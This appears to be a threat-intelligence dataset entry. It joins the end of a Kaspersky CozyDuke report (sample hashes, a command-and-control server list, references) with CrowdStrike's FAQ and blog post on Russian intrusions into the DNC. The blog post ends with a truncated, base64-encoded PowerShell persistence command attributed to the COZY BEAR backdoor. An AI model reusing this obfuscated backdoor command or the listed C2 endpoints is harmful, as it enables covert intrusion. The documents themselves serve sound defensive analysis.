doc853.ex_ 93176df76e351b3ea829e0e6c6832bdf, doc853.pdf 9ad55b83f2eec0c19873a770b0c86a2f, reader_sl.ex_ f16d!8ec8702518471f637eb5313ab2 1.ex_ 8670710bc9477431a01a576b6b5c1b2a 93176df76e351b3ea829e0e6c6832bdf, droppedhppscan854.pdf f58a4369b8176edbde4396dc977c9008, droppedreader_sl.ex_ 83f57f0116a3b3d69ef7b1dbe9943801 b5553645fe819a93aafe2894da13dae7 ac!b2823fc655637657dcbd25f35af8 1a42acbdb285a7fba17f95068822ea4e d543904651b180fd5e4dc1584e639b5e d7af9a4010c75af6756a603fd6aef5a4 93176df76e351b3ea829e0e6c6832bdf, 3852.pdf f2b05e6b01be3b6cb14e9068e7a66fc1, droppedreader_sl.ex_ 57a1f0658712ee7b3a724b6d07e97259, dropped3852.ex_ 93176df76e351b3ea829e0e6c6832bdf, 5463.pdf eb22b99d44223866e24872d80a4ddefd, dropped5463reader_sl.ex_ 90bd910ee161b71c7a37ac642f910059, dropped5463.ex_ 1a262a7bfecd981d7874633f41ea5de8 98a6484533fa12a9ba6b1bd9df1899dc 7f6bca4f08c63e597bed969f5b729c56 08709ef0e3d467ce843af4deb77d74d5 Related CozyDuke C&Cs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 121.193.130.170:443/wp-ajax.php 183.78.169.5:443/search.php 200.119.128.45:443/mobile.php 200.125.133.28:443/search.php 200.125.142.11:443/news.php 201.76.51.10:443/plugins/json.php 202.206.232.20:443/rss.php 202.76.237.216:443/search.php 203.156.161.49:443/plugins/twitter.php 208.75.241.246:443/msearch.php 209.40.72.2:443/plugins/fsearch.php 210.59.2.20:443/search.php 208.77.177.24:443/fsearch.php www.getiton.hants.org.uk:80/themes/front/img/ajax.php www.seccionpolitica.com.ar:80/galeria/index.php 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/profile.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Appendix: Parallel and Previous Research The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor , Securelist, Feb 2013 Miniduke is back: Nemesis Gemina and the Botgen Studio Securelist, July 2014 MiniDuke 2 (CosmicDuke) , CrySyS, July 2014 , COSMICDUKE Cosmu with a twist of MiniDuke [pdf] Secure, September 2014 THE CASE OF THE MODIFIED BINARIES , Leviathan , F- Security, October 2014 A word on CosmicDuke 2014 , Blaze’s Security Blog, September OnionDuke: APT Attacks Via the Tor Network November 2014 The Connections Between MiniDuke, CosmicDuke and , F-Secure, OnionDuke , F-Secure, January 2015 Kaspersky Lab products detect the malware used by the CozyDuke threat actor as: HEUR:Trojan.Win32.CozyDuke.gen Trojan.Win32.CozyBear.* APT COZYDUKE SPYWARE The CozyDuke APT Your email address will not be published. Required #elds are marked * Type your comment here Name * Email * Comment JIM BISHOP Posted on April 27, 2015. 12:24 pm Great post! Very detailed and informative. Reply // LATEST POSTS SOC, TI AND IR POSTS APT REPORTS CRIMEWARE REPORTS MALWARE DESCRIPTIONS Attackers exploiting a patched FortiClient EMS vulnerability in the wild Lazarus group evolves its infection chain with old and new malware Analysis of Cyber Anarchy Squad attacks targeting Russian and Belarusian organizations Download a banker to track your parcel ASHLEY MUÑOZ, FRANCESCO FIGURELLI, CRISTIAN SOUZA, EDUARDO OVALLE, AREG BAGHINYAN VASILY BERDNIKOV, SOJUN RYU KASPERSKY DMITRY KALININ // LATEST WEBINARS THREAT INTELLIGENCE AND IR 04 SEP 2024, 5:00PM 60 MIN Inside the Dark Web: exploring the human side of cybercriminals TECHNOLOGIES AND SERVICES 13 AUG 2024, 5:00PM 60 MIN The Cybersecurity Buyer’s Dilemma: Hype vs (True) Expertise OLEG GOROBETS, CYBERTHREAT TALKS 60 MIN 16 JUL 2024, 5:00PM Cybersecurity’s human factor – more than an unpatched vulnerability TRAININGS AND WORKSHOPS 09 JUL 2024, 4:00PM 60 MIN Building and prioritizing detection engineering backlogs with MITRE ATT&CK ANNA PAVLOVSKAYA ALEXANDER LISKIN OLEG GOROBETS ANDREY TAMOYKIN // REPORTS BellaCPP: Discovering a new Lazarus group evolves its BellaCPP: Discovering a new BellaCiao variant written in C++ While investigating an incident involving the BellaCiao .NET malware, Kaspersky researchers discovered a C++ version they dubbed “BellaCPP”. Lazarus group evolves its infection chain with old and new malware Lazarus targets employees of a nuclear-related organization with a bunch of malware, such as MISTPEN, LPEClient, RollMid, CookieTime and a new modular backdoor CookiePlus. Careto is back: what’s new after 10 years of silence? Kaspersky researchers analyze 2019, 2022 and 2024 attacks attributed to Careto APT with medium to high con#dence. APT trends report Q3 2024 The report features the most signi#cant developments relating to APT groups in Q3 2024, including hacktivist activity, new APT tools and campaigns. // SUBSCRIBE TO OUR WEEKLY E- MAILS The hottest research right in your inbox Email Subscribe I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I #nd at the bottom of any e-mail sent to me for the purposes mentioned above. THREATS CATEGORIES OTHER SECTIONS APT (Targeted attacks) APT reports Secure environment (IoT) Mobile threats Financial threats Malware descriptions Security Bulletin Malware reports Archive All tags Webinars APT Logbook Spam and phishing Statistics Spam and phishing reports Industrial threats Security technologies Web threats Research Vulnerabilities and Publications exploits All threats All categories Encyclopedia Threats descriptions KSB 2024 © 2024 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respective owners. Privacy Policy License Agreement Cookies"
apt29,cti-hal,13c1a4a91d81,G0016,"|||| BLOGBLOGBLOGBLOG Featured ⌄ Featured Featured Featured Recent ⌄ Recent Recent Recent Video ⌄ Video Video Video Category ⌄ Category Category Category Start Free Trial Start Free Trial Start Free Trial Start Free Trial !     ✉ CrowdStrike’s work with the Democratic National Committee: Setting the record straight June 05, 2020 | editorialteam | From The Front Lines June 5, 2020 UPDATE Blog update following the release of the testimony by Shawn Henry, CSO and President of CrowdStrike Services, before the House Intelligence Committee that was recently declassified. What was CrowdStrike’s role in investigating the hack of the DNC? CrowdStrike was contacted on April 30, 2016 to respond to a suspected breach. We began our work with the DNC on May 1, 2016, collecting intelligence and analyzing the breach. After conducting this analysis and identifying the adversaries on the network, on June 10, 2016 we initiated a coordinated remediation event to ensure the intruders were removed and could not regain access. That remediation process lasted approximately 2-3 days and was completed on June 13, 2016. Why did the DNC contact CrowdStrike? The DNC contacted CrowdStrike to respond to a suspected cyber attack impacting its network. The DNC was first alerted to the hack by the FBI in September 2015. According to testimony by DNC IT contractor Yared Tamene Wolde-Yohannes, the FBI attributed the breach to the Russian Government in September 2015 (page 7). Why did the DNC hire CrowdStrike instead of just working with the FBI to investigate the hack? The FBI doesn’t perform incident response or network remediation services when organizations need to get back to business after a breach. CrowdStrike is a leader in protecting customers around the world from cyber threats. It is common for organizations to hire 1 ___ third-party industry experts, like CrowdStrike, to investigate and remediate cyber attacks when they suspect a breach even if they are collaborating with law enforcement. As John Carlin, former Assistant Attorney General for the National Security Division at The Department of Justice, testified before the House Intelligence Committee (cited from page 21 of his testimony): “A lot of -- outside of any political organization, companies, most corporations, they often would use these third party contractors, who they hired through their own counsel, and maximize the control from the point of view of the victim.” Did CrowdStrike have proof that Russia hacked the DNC? Yes, and this is also supported by the U.S. Intelligence community and independent Congressional reports. Following a comprehensive investigation that CrowdStrike detailed publicly, the company concluded in May 2016 that two separate Russian intelligence-affiliated adversaries breached the DNC network. To reference, CrowdStrike’s account of their DNC investigation, published on June 14, 2016, “CrowdStrike Services Inc., our Incident Response group, was called by the Democratic National Committee (DNC), the formal governing body for the US Democratic Party, to respond to a suspected breach. We deployed our IR team and technology and immediately identified two sophisticated adversaries on the network – COZY BEAR and FANCY BEAR…. At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016.” This conclusion has most recently been supported by the Senate Intelligence Committee in April 2020 issuing a report validating the previous conclusions of the Intelligence community, published on January 6, 2017, that Russia was behind the DNC data breach. The Senate report states on page 48: “The Committee found that specific intelligence as well as open source assessments support the assessment that President Putin approved and directed aspects of this influence campaign.” Furthermore, in his testimony in front of the House Intelligence Committee, Shawn Henry stated the following with regards to CrowdStrike’s degree of confidence that the intrusion activity can be attributed to Russia, cited from page 24: 1. HENRY: We said that we had a high degree of confidence it was the Russian Government. And our analysts that looked at it and that had looked at these types of attacks before, many different types of attacks similar to this in different environments, certain tools that were used, certain methods by which they were moving in the environment,and looking at the types of data that was being targeted, that it was consistent with a nation-state adversary and associated with Russian intelligence. Have any other organizations concluded that Russia was behind the DNC hack? Yes. CrowdStrike’s conclusion that Russia was behind the DNC hack is supported by the U.S. Intelligence community and also by independent Congressional reports. Most recently, the Senate Intelligence Committee released a report in April 2020 that validated the previous conclusions of the Intelligence Community Assessment, published on January 6, 2017, all concluding that Russia was behind the DNC data breach. Page 157 of the Senate report states that the Select Committee on Intelligence “conducted an extensive examination of the intelligence demonstrating Russia's intrusions into DNC networks.“ Senator Richard Burr (R - North Carolina), who served as Chairman of the Senate Intelligence Committee at the time the report was issued, confirmed this finding: “The Committee found no reason to dispute the Intelligence Community’s conclusions.” The Intelligence Community Assessment, published on January 6, 2017 also confirms that Russia was behind the DNC hack, stating on page 2 of the report: “In July 2015, Russian intelligence gained access to Democratic National Committee (DNC) networks and maintained that access until at least June 2016. This unclassified ODNI report was based on extensive classified intelligence collected by the CIA, NSA, and FBI; the ODNI determined the classified intelligence should not be released in order to protect the sensitive sources and methods by which it was collected. It’s also worth noting that other security companies, including Fidelis and FireEye have supported CrowdStrike’s analysis. Does CrowdStrike have evidence that data was exfiltrated from the DNC network? Yes. Shawn Henry stated in his testimony to the House Intelligence Committee that CrowdStrike had indicators of exfiltration (page 32) and that data had clearly left the network. Also, on page 2, the Intelligence Community Assessment also confirmed that the Russian intelligence agency GRU “had exfiltrated large volumes of data from the DNC.” Did CrowdStrike see in real-time the adversaries exfiltrate data and emails from the DNC network? No and that’s typical for incident response cases. In the vast majority of cyber investigations, incident responders don’t witness exfiltration in real-time. In fact, often we are called in after theft has taken place. We collect forensics, evidence of prior activity on the network, map where the adversary has gained access and prepare remediation plans. In this particular case, CrowdStrike saw circumstantial evidence of data exfiltration from the DNC network. As a reference point circumstantial evidence is the type of evidence such as DNA analysis or fingerprints that are fully admissible in courts. Shawn Henry stated in his testimony that CrowdStrike had indicators of exfiltration (page 32 of the testimony): “Counsel just reminded me that, as it relates to the DNC' we have indicators that data was exfiltrated. We did not have concrete evidence that data was exfiltrated from the DNC, but we have indicators that it was exfiltrated.' and circumstantial evidence that data was taken as he states on page 75 ”so there is circumstantial evidence that it was taken” and page 76: “MR. HENRY: So, to go back, because I think it's important to characterize this. We didn't have a network sensor in place that saw data leave' We said that the data Ieft based on the circumstantial evidence. That was a conclusion that we made. when I answered that question, I was trying to be as factually accurate' I want to provide the facts. so I said that we didn't have direct evidence' But we made a conclusion that the data left the network.” On page 32 of the testimony, Henry also explains that “We don't have video of it happening, but there are indicators that it happened” and “we did not have concrete evidence that data was exfiltrated from the DNC, but we have indicators that it was exfiltrated.” As another reference point, the independent report by Special Counsel Robert S. Mueller also cites the theft of documents from the DNC and DCCC on page 40, stating the following: “Officers from Unit 26165 stole thousands of documents from the DCCC and DNC networks, including significant amounts of data pertaining to the 2016 U.S. federal elections. Stolen documents included internal strategy documents, fundraising data, opposition research, and emails from the work inboxes of DNC employees.” Is it true that part of the exfiltration happened after CrowdStrike was already engaged by the DNC? This question about the specific timeline of the exfiltration is addressed directly by Shawn Henry in his testimony on page 26. “MR. HENRY: So the analysis started the first day or two in May, and then that was about 4 to 6 weeks. I think, on June 10th, we started what we call the remediation event. so we collected enough intelligence. We identified where the adversaries were in the environment' We came up with a remediation plan to say we see them in multiple locations. This - these are the actions that we need to execute in order to put a new infrastructure in place and to ensure that the adversaries don't have access to the new infrastructure. So that would have been June 10th when we started. And we did the remediation event over a couple of days.” Of note, it is a standard practice in incident response to first coordinate a remediation event to prevent the adversary from doing further damage and following that to fully restore network functionality. We followed industry best practices to accomplish the fastest remediation path for our customer. On page 27 of Shawn Henry’s testimony, he further explains CrowdStrike’s role as incident responders: “To be clear, our goal, my goal was to protect the client. We were hired to protect the client. We identified an adversary there. The goal was to make sure that the adversary was removed and the client had a clean environment with which to work.” Did any DNC endpoints protected by your technology get breached in subsequent attacks? There is no indication of subsequent breaches taking place on any DNC machine protected by CrowdStrike Falcon®. Do you have a comment about the allegation that Russia stole Democratic Party emails from John Podesta and then passed them to WikiLeaks? CrowdStrike was not involved in investigating John Podesta’s email leaks. Henry says on page 62 of this testimony, he “has no relationship with them .” What is the timeline of the DNC hack? According to public records, this is the timeline of the DNC hack that CrowdStrike was hired to investigate. : Beginning in July 2015: “Russian intelligence gained access to Democratic National Committee (DNC) networks ( page 2). Sept. 25, 2015: An FBI agent contacted the DNC Information Technology director/contractor in charge of the DNC network, alerting him to suspicious activity in the network and referencing the “Dukes” (p16), a well-known pseudonym in the cybersecurity community for Russian government actors. The FBI agent called the DNC again in October 2015, November 2015, December 2015 (p12) asking the contractor to “corroborate, to look into specific activities that the FBI had noticed emanating from the DNC network that could be nefarious.” (p8) Beginning in December 2015: Russian intelligence actors engaged in attacks on election systems, including scanning a “widely used vendor of election systems,” according to DHS. The attacks continued through June 2016 (p30.) Beginning April 2016: The GRU “…stole thousands of documents from the DCCC and DNC networks, including significant amounts of data pertaining to the 2016 U.S. federal elections. Stolen documents included internal strategy documents, fundraising data, opposition research, and emails from the work inboxes of DNC employees.” (p40) April 14, 2016: “The GRU began stealing DCCC data shortly after it gained access to the network. On April 14, 2016 (approximately three days after the initial intrusion) GRU officers downloaded rar.exe onto the DCCC’s document server. The following day, the GRU searched one compromised DCCC computer for files containing search terms that included “Hillary,” “DNC,” “Cruz,” and “Trump.” April 28, 2016: The DNC contractor discovered unusual activity on the DNC network. “…the first day that we found activity on our network that was unusual, nefarious by adversaries…” ""we saw sort of very loud activity… on one of our Window servers that couldn't have been done by one of us…an authorized user. The kinds of activity we were looking at was accessing multiple different password vaults of different users, which is not something that anyone would do. And so that triggered an alarm for us…” (p24) April 30, 2016: CrowdStrike was contacted by the DNC outside counsel to discuss a suspected breach. This was CrowdStrike’s first involvement in this matter. (p6) May 1-2, 2016: CrowdStrike initiated an investigation into the breach of the DNC network. (p26) June 10-13, 2016: The DNC network remediation took place. (p35) June 13, 2016: CrowdStrike and the DNC outside counsel alerted the FBI that they had identified Russian actors on the DNC network. (p35) June 2016: The FBI requested forensic information, indicators of compromise (pieces of malicious code) that CrowdStrike discovered on the DNC computer network. With DNC permission, CrowdStrike continued to share information from the breach through December 2016, including “digital images” or copies of hard-drives. (p35) June 14, 2016: The DNC, via CrowdStrike, publicly announced the breach of the DNC network and detailed its investigation. July 29, 2016: The DCCC publicly announced it was a victim of Russian hacking. August 26, 2016: Separate cyber activity continued on state election systems through Dec 29, 2016 ( p25-26.) Later it was discovered the Russians had, at least, scanned a total of 21 state election infrastructures. (p50) September 20, 2016: “On September 20, 2016, the GRU began to generate copies of the DNC data using function designed to allow users to produce backups of databases (referred to as “snapshots”). The GRU then stole those snapshots by moving them to account that they controlled, from there the copies were moved to GRU-controlled computers. The GRU stole approximately 300 gigabytes of data from the DNC cloud-based account.” (pp 49-50) October 7, 2016: DHS & ODNI release joint statement about stolen emails: “The U.S. Intelligence Community (USIC) is confident that the Russian Government directed the recent compromises of e- mails from US persons and institutions, including from US political organizations….These thefts and disclosures are intended to interfere with the US election process.(p1) January 6, 2017. “The Department of Homeland Security (DHS) designated the infrastructure used to administer the Nation’s elections as critical infrastructure. This designation recognizes that the United States’ election infrastructure is of such vital importance to the American way of life that its incapacitation or destruction would have a devastating effect on the country.” (p1) January 22, 2020 UPDATE CrowdStrike is non-partisan - we routinely work with both Republican and Democratic organizations to protect them from cyber-attacks - along with thousands of other organizations around the world of all industries and sizes. Here are a few key facts about CrowdStrike: We were founded in California and are headquartered in the heart of Silicon Valley in Sunnyvale, California. We are one of the fastest growing global companies in cybersecurity today. Our founders have no connections to Ukraine. Suggestions to the contrary are completely false. We have never had physical possession of the DNC servers. We conducted our investigation using a process called “imaging” — an established practice in cyber investigations that involves making a copy of the hard drives and memory. This is standard procedure for cyber investigations. We worked closely with law enforcement and provided all forensic evidence and analysis to the FBI as requested. We are proud of our work and will remain focused on our mission of protecting our customers around the world from dangerous cyber threats.We are grateful that the media has debunked false claims about our work for the Democratic National Committee (DNC) in 2016: The Washington Post, The Russians manipulated our elections. We helped. An opinion piece by David Ignatius discussing the lessons from Thomas Rid’s new book, making the case that the 2016 election meddling was a proven example of Russia’s disinformation tenet. The New York Times, Republican-Led Review Backs Intelligence Findings on Russian Interference: A three-year review by the Republican-led Senate Intelligence Committee unanimously found that the intelligence community assessment stating that Russia breached the DNC was fundamentally sound and untainted by politics. NBC News, Meet the Press 12/29/19: Clint Watts and Chuck Todd discuss CrowdStrike and the conspiracy theory that has been debunked. Transcript here: https://www.nbcnews.com/meet-the- press/meet-press-december-29-2019-n1106036 The Washington Post, In call to Ukraine’s president, Trump revived a favorite conspiracy theory about the DNC hack: Discusses the CrowdStrike conspiracy theory and how it has been debunked. CNN Business, What is CrowdStrike and why is it part of the Trump whistleblower complaint?: Gives background on CrowdStrike and debunks the conspiracy theory Wired, How Trump’s Ukraine Mess Entangled CrowdStrike: Discusses the CrowdStrike theory and debunks the idea that there is a missing server. NBC News, Debunking The Crowdstrike Conspiracy Theory Discusses the CrowdStrike theory and how it has been debunked. The Daily Beast, The Truth About Trump’s Insane Ukraine ‘Server’ Conspiracy: Describes why Trump’s theories about Ukraine and CrowdStrike have been debunked. CNN, “Don’t miss the totally debunked conspiracy theory Donald Trump pushed in the Ukraine call” Discusses the conspiracy theory and how it has been debunked. September 25, 2019 Update: With regards to our investigation of the DNC hack in 2016, we provided all forensic evidence and analysis to the FBI. As we’ve stated before, we stand by our findings and conclusions that have been fully supported by the US Intelligence community. FAQ on Recent News Coverage of CrowdStrike Is your owner Ukrainian? No. CrowdStrike was founded by George Kurtz and Dmitri Alperovitch. George is an American entrepreneur and recognized security expert, author, entrepreneur, and speaker. He also started Foundstone, a worldwide security products and services company that was acquired by McAfee in 2004. CrowdStrike’s Co-founder Dmitri Alperovitch is a Russia-born U.S. citizen, who has spent all of his adult life in the United States, and has no connection to Ukraine. As a public company, our ownership is available on the SEC.gov website. Do you stand behind your work for the DNC? As we’ve repeatedly stated, we stand by the findings and analysis of our investigation, and, as detailed in our company statement, we’ve provided all forensic evidence and analysis to the FBI as requested. Additionally, our findings have been supported by the U.S. intelligence community and other cybersecurity companies. The investigation is detailed on our blog below. Did you comply with FBI’s requests for information? We’ve provided all forensic evidence and analysis to the FBI related to the DNC investigation as requested. We have never declined any request for information from the FBI related to this investigation, and there are no pending requests for information by the FBI. Do you have the DNC servers? We have never taken physical possession of any DNC servers. When cyber investigators respond to an incident, they capture that evidence in a process called “imaging.” It involves making an exact byte-for-byte copy of the hard drives. They do the same for the machine’s memory, capturing evidence that would otherwise be lost at the next reboot, and they monitor and store the traffic passing through the victim’s network. This has been standard procedure in incident response investigations for decades. The images, not the computer’s hardware, provide the evidence. Our cloud-native, crowdsourced approach to solving cybersecurity enables us to deliver state- of- the-art protection to organizations big and small. Consequently, we are proud that customers from every major industry, level of government, and political affiliation turn to CrowdStrike to stop breaches. Are you affiliated with the Democratic party? CrowdStrike is not affiliated with any political party. We are a public cybersecurity company, and are non-partisan. We have done cybersecurity work for, and currently protect, both Republican and Democratic political organizations at the state, local, and federal level, and we have thousands of non-political companies and organizations as customers. Do you have Secretary Hillary Clinton’s email server? Have you ever had access to her emails? No. We have never worked for Secretary Clinton or her campaign, and never had access to her server or emails. Where can I find more information? Many news outlets have written about CrowdStrike’s investigation of the DNC hack and subsequent comments made by President Trump. You can learn more at: NBC News, November 14, 2019: Debunking The Crowdstrike Conspiracy Theory CNN, September 30, 2019: ""Don't miss the totally debunked conspiracy theory Donald Trump pushed in the Ukraine call"" AP/Washington Post, September 27, 2019: ""Why Trump asked Ukraine’s president about ‘CrowdStrike’"" Daily Beast, September 25, 2019: ""The Truth About Trump’s Insane Ukraine ‘Server’ Conspiracy"" Wired, September 25, 2019: ""How Trump’s Ukraine Mess Entangled CrowdStrike"" Daily Beast, July 17, 2019: ""Trump’s ‘Missing DNC Server’ Is Neither Missing Nor a Server"" Security Week, October 4, 2018: ""The DNC Hacker Indictment: A Lesson in Failed Misattribution"" Daily Beast, July 16, 2018 : ""Trump’s ‘Missing DNC Server’ Is Neither Missing Nor a Server"" Daily Beast, June 13, 2018: ""Mueller Indicts 12 Russian Officers for Hacking Dems in 2016"" U.S. Department of Justice Indictment, June 13, 2018: ""Case 1:18-cr-00215-ABJ"" ArsTechnica, March 23, 2018: ""DNC “lone hacker” Guccifer 2.0 pegged as Russian spy after opsec fail” Tech Crunch, March 22, 2018: ""More evidence ties alleged DNC hacker Guccifer 2.0 to Russian intelligence” AP, January 26, 2018: ""Report: Dutch spies caught Russian hackers on tape” De Volkskrant, January 25, 2018: ""Dutch Intelligence Watched Russian Hackers Attack the U.S” AP, November 2, 2017: ""Russia hackers pursued Putin foes, not just US Democrats” The Hill, August 14, 2017: ""Why the latest theory about the DNC not being hacked is probably wrong” Daily Beast, July 20, 2017: ""Putin’s Hackers Now Under Attack— From Microsoft” Washington Post, July 6, 2017: ""Here’s the public evidence that supports the idea that Russia interfered in the 2016 election” Senate testimony of Thomas Rid, March 30, 2017 Senate testimony of Kevin Mandia, March 30, 2017 Wired Magazine, March 5, 2017: “Hunting the DNC hackers: how Crowdstrike found proof Russia hacked the Democrats” New York Times, Jan. 6, 2017: “Intelligence Report on Russian Hacking” (includes full copy of the official U.S. Intelligence and Law Enforcement Agency report): New York Times, Dec. 13, 2016: “The Perfect Weapon: How Russian Cyberpower Invaded the U.S.” Washington Post, June 20, 2016: “Cyber researchers confirm Russian government hack of Democratic National Committee” ThreatConnect Blog, June 17, 2016: “Rebooting Watergate: Tapping into the Democratic National Committee” SecureWorks Blog, June 16, 2016: “Russian Threat Group Targets Clinton Campaign” June 15, 2016 UPDATE: CrowdStrike stands fully by its analysis and findings identifying two separate Russian intelligence-affiliated adversaries present in the DNC network in May 2016. On June 15, 2016 a blog post to a Wordpress site authored by an individual using the moniker Guccifer 2.0 claimed credit for breaching the Democratic National Committee. This blog post presents documents alleged to have originated from the DNC. Whether or not this posting is part of a Russian Intelligence disinformation campaign, we are exploring the documents’ authenticity and origin. Regardless, these claims do nothing to lessen our findings relating to the Russian government’s involvement, portions of which we have documented for the public and the greater security community. June 14, 2016 Bears in the Midst: Intrusion Into the Democratic National Committee By Dmitri Alperovitch There is rarely a dull day at CrowdStrike where we are not detecting or responding to a breach at a company somewhere around the globe. In all of these cases, we operate under strict confidentiality rules with our customers and cannot reveal publicly any information about these attacks. But on rare occasions, a customer decides to go public with information about their incident and give us permission to share our knowledge of the adversary tradecraft with the broader community and help protect even those who do not happen to be our customers. This story is about one of those cases. CrowdStrike Services Inc., our Incident Response group, was called by the Democratic National Committee (DNC), the formal governing body for the US Democratic Party, to respond to a suspected breach. We deployed our IR team and technology and immediately identified two sophisticated adversaries on the network - COZY BEAR and FANCY BEAR. We’ve had lots of experience with both of these actors attempting to target our customers in the past and know them well. In fact, our team considers them some of the best threat actors out of all the numerous nation-state, criminal and hacktivist/terrorist groups we encounter on a daily basis. Their tradecraft is superb, operational security second to none and the extensive usage of ‘living-off-the- land’ techniques enables them to easily bypass many security solutions they encounter. In particular, we identified advanced methods consistent with nation-state level capabilities including deliberate targeting and ‘access management’ tradecraft - both groups were constantly going back into the environment to change out their implants, modify persistent methods, move to new Command & Control channels and perform other tasks to try to stay ahead of being detected. Both adversaries engage in extensive political and economic espionage for the benefit of the government of the Russian Federation and are believed to be closely linked to the Russian government’s powerful and highly capable intelligence services. COZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the White House, State Department, and US Joint Chiefs of Staff. In addition to the US government, they have targeted organizations across the Defense, Energy, Extractive, Financial, Insurance, Legal, Manufacturing Media, Think Tanks, Pharmaceutical, Research and Technology industries, along with Universities. Victims have also been observed in Western Europe, Brazil, China, Japan, Mexico, New Zealand, South Korea, Turkey and Central Asian countries. COZY BEAR’s preferred intrusion method is a broadly targeted spearphish campaign that typically includes web links to a malicious dropper. Once executed on the machine, the code will deliver one of a number of sophisticated Remote Access Tools (RATs), including AdobeARM, ATI-Agent, and MiniDionis. On many occasions, both the dropper and the payload will contain a range of techniques to ensure the sample is not being analyzed on a virtual machine, using a debugger, or located within a sandbox. They have extensive checks for the various security software that is installed on the system and their specific configurations. When specific versions are discovered that may cause issues for the RAT, it promptly exits. These actions demonstrate a well-resourced adversary with a thorough implant- testing regime that is highly attuned to slight configuration issues that may result in their detection, and which would cause them to deploy a different tool instead. The implants are highly configurable via encrypted configuration files, which allow the adversary to customize various components, including C2 servers, the list of initial tasks to carry out, persistence mechanisms, encryption keys and others. An HTTP protocol with encrypted payload is used for the Command & Control communication. FANCY BEAR (also known as Sofacy or APT 28) is a separate Russian-based threat actor, which has been active since mid 2000s, and has been responsible for targeted intrusion campaigns against the Aerospace, Defense, Energy, Government and Media sectors. Their victims have been identified in the United States, Western Europe, Brazil, Canada, China, Georgia, Iran, Japan, Malaysia and South Korea. Extensive targeting of defense ministries and other military victims has been observed, the profile of which closely mirrors the strategic interests of the Russian government, and may indicate affiliation with Главное Разведывательное Управление (Main Intelligence Department) or GRU, Russia’s premier military intelligence service. This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones. This group is known for its technique of registering domains that closely resemble domains of legitimate organizations they plan to target. Afterwards, they establish phishing sites on these domains that spoof the look and feel of the victim’s web-based email services in order to steal their credentials. FANCY BEAR has also been linked publicly to intrusions into the German Bundestag and France’s TV5 Monde TV station in April 2015. At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016. We have identified no collaboration between the two actors, or even an awareness of one by the other. Instead, we observed the two Russian espionage groups compromise the same systems and engage separately in the theft of identical credentials. While you would virtually never see Western intelligence agencies going after the same target without de-confliction for fear of compromising each other’s operations, in Russia this is not an uncommon scenario. “Putin’s Hydra: Inside Russia’s Intelligence Services”, a recent paper from European Council on Foreign Relations, does an excellent job outlining the highly adversarial relationship between Russia’s main intelligence services - Федеральная Служба Безопасности (FSB), the primary domestic intelligence agency but one with also significant external collection and ‘active measures’ remit, Служба Внешней Разведки (SVR), the primary foreign intelligence agency, and the aforementioned GRU. Not only do they have overlapping areas of responsibility, but also rarely share intelligence and even occasionally steal sources from each other and compromise operations. Thus, it is not surprising to see them engage in intrusions against the same victim, even when it may be a waste of resources and lead to the discovery and potential compromise of mutual operations. The COZY BEAR intrusion relied primarily on the SeaDaddy implant developed in Python and compiled with py2exe and another Powershell backdoor with persistence accomplished via Windows Management Instrumentation (WMI) system, which allowed the adversary to launch malicious code automatically after a specified period of system uptime or on a specific schedule. The Powershell backdoor is ingenious in its simplicity and power. It consists of a single obfuscated command setup to run persistently, such as: powershell.exe -NonInteractive -ExecutionPolicy Bypass - EncodedCommand ZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGM AcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJA CQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5 AHsADQAKAAkACQAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYg BqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUA bQBvAHIAeQBTAHQAcgBlAGEAbQANAAoACQAJACQAYwBzAC AAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0A GUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdA BvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIA ZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACA AQAAoACQAbQBzACwAIAAkAGMAcgBUAHIALAAgAFsAUwB5A HMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBw AHQAbwBnAHIAYQBwAGgAeQAuAEMAcgB5AHAAdABvAFMAdA ByAGUAYQBtAE0AbwBkAGUAXQA6ADoAVwByAGkAdABlACkAD QAKAAkACQAkAGMAcwAuAFcAcgBpAHQAZQAoACQAZABhAH QAYQAsACAAMAAsACAAJABkAGEAdABhAC4ATABlAG4AZwB0 AGgAKQANAAoACQAJACQAYwBzAC4ARgBsAHUAcwBoAEYAa QBuAGEAbABCAGwAbwBjAGsAKAApAA0ACgAJAAkAJAByAGU AdAAgAD0AIAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApAA 0ACgAJAAkAJABjAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJ AAkAJABtAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAH0AD QAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHI AbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjA HQAaQBvAG4AIABkAGUAYwByAEEAZQBzACgAJABlAG4AYwBE AGEAdABhACwAIAAkAGsAZQB5ACwAIAAkAGkAdgApAA0ACgB 7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACg 